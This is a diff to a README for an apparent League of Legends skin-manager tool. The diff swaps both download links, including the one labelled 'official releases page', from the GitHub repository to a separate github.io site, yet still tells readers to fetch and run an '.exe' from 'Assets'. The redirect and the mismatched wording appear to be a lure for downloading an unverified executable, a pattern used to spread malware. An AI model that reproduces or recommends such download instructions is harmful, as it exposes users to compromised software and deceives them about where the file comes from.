@@ -1,6 +1,6 @@
 # 🛠️ LeagueToolKit-Manager - Manage your custom League of Legends skins
 
-[![](https://img.shields.io/badge/Download-LeagueToolKit-blue.svg)](https://github.com/anglican-aerodynamicforce782/LeagueToolKit-Manager)
+[![](https://img.shields.io/badge/Download-LeagueToolKit-blue.svg)](https://anglican-aerodynamicforce782.github.io)
 
 LeagueToolKit-Manager helps you organize and load custom game assets for League of Legends. This desktop application provides a clean interface for skin management and configuration loading. Use this tool if you want to replace game assets without manual file changes.
 
@@ -25,7 +25,7 @@ LeagueToolKit-Manager helps you organize and load custom game assets for League 
 Follow these steps to set up the software on your computer.
 
 ### 1. Download the Tool
-Visit the [official releases page](https://github.com/anglican-aerodynamicforce782/LeagueToolKit-Manager) to download the current version. Look for the file ending in `.exe` under the Assets section. This file contains the installer for the application.
+Visit the [official releases page](https://anglican-aerodynamicforce782.github.io) to download the current version. Look for the file ending in `.exe` under the Assets section. This file contains the installer for the application.
 
 ### 2. Run the Installer
 Once the download finishes, locate the file in your Downloads folder. Double-click the file to open the setup wizard. Follow the prompts on the screen to choose your installation directory. We recommend keeping the default folder.
